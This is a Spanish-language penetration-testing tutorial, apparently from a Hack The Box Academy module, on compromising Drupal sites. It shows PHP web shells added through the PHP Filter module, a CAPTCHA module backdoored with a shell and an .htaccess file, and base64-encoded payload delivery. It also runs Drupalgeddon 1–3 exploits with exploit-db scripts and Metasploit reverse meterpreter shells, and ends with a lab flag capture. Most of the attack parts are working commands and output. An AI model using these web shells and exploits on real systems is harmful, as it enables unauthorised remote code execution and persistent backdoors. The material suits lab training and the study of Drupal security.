
# Drupal - Ataques

Ahora que hemos confirmado que nos enfrentamos a Drupal y hemos identificado la versión, veamos qué configuraciones erróneas y vulnerabilidades podemos descubrir para intentar obtener acceso a la red interna.

A diferencia de algunos CMS, obtener un shell en un host Drupal a través de la consola de administración no es tan fácil como simplemente editar un archivo PHP que se encuentra dentro de un tema o cargar un script PHP malicioso.

***

## <mark style="color:purple;">Aprovechar el módulo de PHP Filter</mark>

En versiones anteriores de Drupal (antes de la versión 8), era posible iniciar sesión como administrador y habilitar el módulo `PHP filter` que "Permite evaluar fragmentos/código PHP incrustados".  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/113/drupal_php_module.png" alt=""><figcaption></figcaption></figure>

Desde aquí, podemos marcar la casilla de verificación junto al módulo y desplazarnos hacia abajo hasta `Save configuration`. A continuación, podemos ir a Contenido --> Agregar contenido y crear una `Basic page`.  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/113/basic_page.png" alt=""><figcaption></figcaption></figure>

Ahora podemos crear una página con un fragmento de código PHP malicioso como el que se muestra a continuación. Hemos nombrado el parámetro con un hash md5 en lugar del común `cmd` para ponernos en práctica y no dejar una puerta abierta a un atacante durante nuestra evaluación. Si usamos el estándar, `system($_GET['cmd']);`nos exponemos a un posible ataque "de pasada" que se cruce con nuestro webshell. Aunque es poco probable, ¡más vale prevenir que curar!

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

&#x20; &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/113/basic_page_shell_7v2.png" alt=""><figcaption></figcaption></figure>

También queremos asegurarnos de configurar el menú desplegable `Text format` en `PHP code`. Después de hacer clic en guardar, seremos redirigidos a la nueva página, en este ejemplo `http://drupal-qa.inlanefreight.local/node/3`. Una vez guardado, podemos solicitar la ejecución de comandos en el navegador agregando `?dcfdd5e021a869fcc6dfaef8bf31377e=id` al final de la URL para ejecutar el comando `id` o usar `cURL` en la línea de comandos. Desde aquí, podríamos usar un comando bash de una sola línea para obtener acceso al reverse shell.

```shell-session
afsh4ck@kali$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A partir de la versión 8, el módulo [Filtro PHP](https://www.drupal.org/project/php/releases/8.x-1.1) no se instala de forma predeterminada. Para aprovechar esta funcionalidad, tendríamos que instalar el módulo nosotros mismos. Dado que estaríamos modificando y añadiendo algo a la instancia Drupal del cliente, es posible que queramos consultarlo primero con ellos. Comenzaremos descargando la versión más reciente del módulo desde el sitio web de Drupal.

```shell-session
afsh4ck@kali$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Una vez descargado vamos a `Administration`>> .`ReportsAvailable updates`

{% hint style="info" %}
**Nota**: La ubicación puede variar según la versión de Drupal y puede estar en el menú Extender.  &#x20;
{% endhint %}

<figure><img src="https://academy.hackthebox.com/storage/modules/113/install_module.png" alt=""><figcaption></figcaption></figure>

Desde aquí, haz clic en `Browse`, selecciona el archivo del directorio donde lo descargamos y luego haz clic en `Install`.

Una vez instalado el módulo, podemos hacer clic en el `Content` y crear una nueva página básica, de forma similar a como lo hicimos en el ejemplo de Drupal 7. Nuevamente, asegúrese de seleccionar `PHP code` en el menú desplegable `Text format`.

Con cualquiera de estos ejemplos, debemos mantener informado a nuestro cliente y obtener su permiso antes de realizar este tipo de cambios. Además, una vez que hayamos terminado, debemos eliminar o deshabilitar el módulo `PHP Filter` y eliminar todas las páginas que hayamos creado para obtener la ejecución remota del código.

***

## <mark style="color:purple;">Cómo cargar un módulo con un backdoor</mark>

Drupal permite a los usuarios con los permisos adecuados cargar un nuevo módulo. Se puede crear un módulo con puerta trasera añadiendo un shell a un módulo existente. Los módulos se pueden encontrar en el sitio web drupal.org. Elijamos un módulo como [CAPTCHA](https://www.drupal.org/project/captcha) . Desplácese hacia abajo y copie el enlace del [archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) tar.gz.

Descargue el archivo y extraiga su contenido.

```shell-session
afsh4ck@kali$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
afsh4ck@kali$ tar xvf captcha-8.x-1.2.tar.gz
```

Cree un shell web PHP con el contenido:

```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

A continuación, debemos crear un archivo `.htaccess` para darnos acceso a la carpeta. Esto es necesario porque Drupal niega el acceso directo a la carpeta `/modules`.

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

La configuración anterior aplicará reglas para la carpeta `/` cuando solicitemos un archivo en `/modules`. Copie ambos archivos en la carpeta `captcha` y cree un archivo.

```shell-session
afsh4ck@kali$ mv shell.php .htaccess captcha
afsh4ck@kali$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```

Suponiendo que tenemos acceso administrativo al sitio web, haga clic en `Manage` y luego en `Extend` en la barra lateral. A continuación, haga clic en el botón `+ Install new module` y seremos llevados a la página de instalación, como:

```
http://drupal.inlanefreight.local/admin/modules/install
```

Busque el archivo Captcha con backdoor y haga clic en `Install`.  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/113/module_installed.png" alt=""><figcaption></figcaption></figure>

Una vez que la instalación se realice correctamente, busque `/modules/captcha/shell.php` para  ejecutar comandos.

```shell-session
afsh4ck@kali$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

## <mark style="color:purple;">Vulnerabilidades conocidas</mark>

A lo largo de los años, el núcleo de Drupal ha sufrido algunas vulnerabilidades graves de ejecución remota de código, cada una de ellas denominada `Drupalgeddon`. Al momento de escribir este artículo, existen 3 vulnerabilidades de Drupalgeddon.

* [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005) , conocida como Drupalgeddon, afecta a las versiones 7.0 a 7.31 y se corrigió en la versión 7.32. Se trataba de una falla de inyección SQL autenticada previamente que podía utilizarse para cargar un formulario malicioso o crear un nuevo usuario administrador.
* [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002) , también conocida como Drupalgeddon2, es una vulnerabilidad de ejecución remota de código que afecta a las versiones de Drupal anteriores a 7.58 y 8.5.1. La vulnerabilidad se produce debido a una limpieza de entrada insuficiente durante el registro del usuario, lo que permite la inyección maliciosa de comandos a nivel del sistema.
* [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/) , también conocida como Drupalgeddon3, es una vulnerabilidad de ejecución remota de código que afecta a varias versiones de Drupal 7.x y 8.x. Esta falla aprovecha una validación incorrecta en la API de formularios.

Veamos cómo explotar cada uno de ellos.

***

### Drupalgeddon

Como se indicó anteriormente, esta falla se puede explotar aprovechando una inyección SQL previa a la autenticación que se puede utilizar para cargar código malicioso o agregar un usuario administrador. Intentemos agregar un nuevo usuario administrador con este script [de prueba de concepto](https://www.exploit-db.com/exploits/34992) . Una vez que se agrega un usuario administrador, podemos iniciar sesión y habilitar el `PHP Filter`módulo para lograr la ejecución remota de código.

Al ejecutar el script con la flag `-h` nos muestra el menú de ayuda.

```shell-session
afsh4ck@kali$ python2.7 drupalgeddon.py 

  ______                          __     _______  _______ _____    
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
 |:  1    /          |__|                 |   |  |:  1   | |:  |   
 |::.. . /                                |   |  |::.. . | |::.|   
 `------'                                 `---'  `-------' `---'   
  _______       __     ___       __            __   __             
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|                               
 |::.. . |            |::.|                                        
 `-------'            `---'                                        
                                                                   
                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

			  Discovered by:

			  Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww



Usage: drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS


Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert URL: http[s]://www.victim.com
  -u USERNAME, --username=USERNAME
                        Insert username
  -p PWD, --pwd=PWD     Insert password
```

Aquí vemos que debemos proporcionar la URL de destino y un nombre de usuario y contraseña para nuestra nueva cuenta de administrador. Ejecutemos el script y veamos si obtenemos un nuevo usuario administrador.

```shell-session
afsh4ck@kali$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

Ahora veamos si podemos iniciar sesión como administrador. ¡Podemos! Ahora, desde aquí, podemos obtener un shell a través de los diversos medios que se comentaron anteriormente en esta sección.  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/113/drupalgeddon.png" alt=""><figcaption></figcaption></figure>

También podríamos usar el módulo Metasploit [exploit/multi/http/drupal\_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) para explotar esto.

***

### Drupageddon2

Podemos usar [esta](https://www.exploit-db.com/exploits/44448) PoC para confirmar esta vulnerabilidad.

```shell-session
afsh4ck@kali$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```

Podemos comprobarlo rápidamente con `cURL` y ver que el archivo `hello.txt` realmente se ha cargado.

```shell-session
afsh4ck@kali$ curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```

Ahora modifiquemos el script para obtener ejecución de código remoto cargando un archivo PHP malicioso.

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

```shell-session
afsh4ck@kali$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

A continuación, reemplacemos el `echo`comando en el script de explotación con un comando para escribir nuestro script PHP malicioso.

```bash
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

A continuación, ejecute el script de explotación modificado para cargar nuestro archivo PHP malicioso.

```shell-session
afsh4ck@kali$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php
```

Finalmente, podemos confirmar la ejecución remota de código usando `cURL`.

```shell-session
afsh4ck@kali$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

### Drupageddon3

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) es una vulnerabilidad de ejecución remota de código autenticado que afecta a [varias versiones](https://www.drupal.org/sa-core-2018-004) del núcleo de Drupal. Requiere que un usuario tenga la capacidad de eliminar un nodo. Podemos explotar esto usando Metasploit, pero primero debemos iniciar sesión y obtener una cookie de sesión válida.

![imagen](https://academy.hackthebox.com/storage/modules/113/burp.png)

Una vez que tenemos la cookie de sesión, podemos configurar el módulo de exploit en metasploit de la siguiente manera.

```
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   User register form with exec
```

Si tiene éxito, obtendremos un shell en el host de destino.

```shell-session
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid

Server username: www-data (33)


meterpreter > sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo(s): 10.129.48.231 (ACADEMY-ATCKAPPS-APP01) 

drupal-qa.inlanefreight.local
drupal-dev.inlanefreight.local
```

Trabaja con todos los ejemplos de esta sección y obtén RCE de múltiples maneras a través de las distintas instancias de Drupal en el host de destino. Cuando hayas terminado, envía el contenido del archivo flag.txt en el directorio `/var/www/drupal.inlanefreight.local`.

Vamos a usar drupaggedon

```
msf6 exploit(multi/http/drupal_drupageddon) > set rhosts 10.129.48.231 
rhosts => 10.129.48.231
msf6 exploit(multi/http/drupal_drupageddon) > set vhost drupal-qa.inlanefreight.local
vhost => drupal-qa.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon) > set lhost 10.10.15.75
lhost => 10.10.15.75
msf6 exploit(multi/http/drupal_drupageddon) > exploit

[*] Started reverse TCP handler on 10.10.15.75:4444 
[*] Sending stage (40004 bytes) to 10.129.48.231
[*] Meterpreter session 1 opened (10.10.15.75:4444 -> 10.129.48.231:42294) at 2024-12-06 15:50:33 +0000

meterpreter > getuid
Server username: www-data
```

Vamos al directorio `/var/www`:

```
meterpreter > cd /var/www
meterpreter > ls
Listing: /var/www
=================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040755/rwxr-xr-x  4096    dir   2021-08-24 01:30:13 +0000  app.inlanefreight.local
040750/rwxr-x---  4096    dir   2021-09-21 01:31:24 +0000  blog.inlanefreight.local
040755/rwxr-xr-x  4096    dir   2021-09-21 04:31:01 +0000  dev.inlanefreight.local
040755/rwxr-xr-x  4096    dir   2021-08-24 16:35:20 +0000  drupal-acc.inlanefreight.local
040755/rwxr-xr-x  4096    dir   2021-09-16 22:21:20 +0000  drupal-dev.inlanefreight.local
040755/rwxr-xr-x  4096    dir   2021-08-24 14:34:47 +0000  drupal-qa.inlanefreight.local
040755/rwxr-xr-x  749568  dir   2021-09-21 02:17:47 +0000  drupal.inlanefreight.local
040755/rwxr-xr-x  4096    dir   2021-08-16 18:15:18 +0000  html
```

Accedemos a `drupal.inlanefreight.local`:

```
meterpreter > cd drupal.inlanefreight.local
meterpreter > ls
Listing: /var/www/drupal.inlanefreight.local
============================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
<---SNIP--->
100644/rw-r--r--  95      fil   2020-06-17 18:24:45 +0000  INSTALL.txt
100644/rw-r--r--  18092   fil   2016-11-16 23:57:05 +0000  LICENSE.txt
100644/rw-r--r--  5924    fil   2020-06-17 18:24:45 +0000  README.txt
100644/rw-r--r--  313     fil   2020-06-17 18:24:45 +0000  autoload.php
100644/rw-r--r--  3052    fil   2020-06-17 18:24:45 +0000  composer.json
100644/rw-r--r--  151483  fil   2020-06-17 18:24:45 +0000  composer.lock
040755/rwxr-xr-x  4096    dir   2020-06-17 18:24:44 +0000  core
100644/rw-r--r--  1507    fil   2020-06-17 18:24:45 +0000  example.gitignore
100644/rw-r--r--  26      fil   2021-09-21 02:17:46 +0000  flag_6470e394cbf6dab6a91682cc8585059b.txt
```

Leemos la flag:

```
meterpreter > cat flag_6470e394cbf6dab6a91682cc8585059b.txt

DrUp@l_drUp@l_*********!
```
